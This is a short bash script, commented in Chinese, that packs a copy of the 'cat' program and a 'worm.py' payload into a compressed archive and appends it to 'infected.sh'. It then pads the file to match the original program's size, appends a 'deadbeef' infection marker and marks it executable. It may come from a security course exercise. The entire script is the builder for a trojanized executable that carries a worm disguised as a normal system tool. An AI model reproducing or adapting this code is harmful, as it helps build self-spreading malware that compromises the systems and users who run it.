#!/bin/bash
# 假設所有文件都已經從server下載過來

# 原本的size
size=$(wc -c temp_cat | awk '{print $1}')
space=`expr $size - 8`

# 壓縮 cat 和 payload
tar -cvzf temp_cat.tar.gz temp_cat worm.py > /dev/null 2>&1

# 刪掉不需要的檔案
#rm temp_cat test.py

# 串接壓縮檔
cat temp_cat.tar.gz >> infected.sh
echo "\n" >> infected.sh
echo "__PAYLOAD_END__" >> infected.sh

# 調整 size 和最後的 byte
truncate --size=${space} infected.sh
echo -n -e '\x64\x65\x61\x64\x62\x65\x61\x66' >> infected.sh

chmod +x infected.sh

# 刪掉這個檔案
#rm build.sh
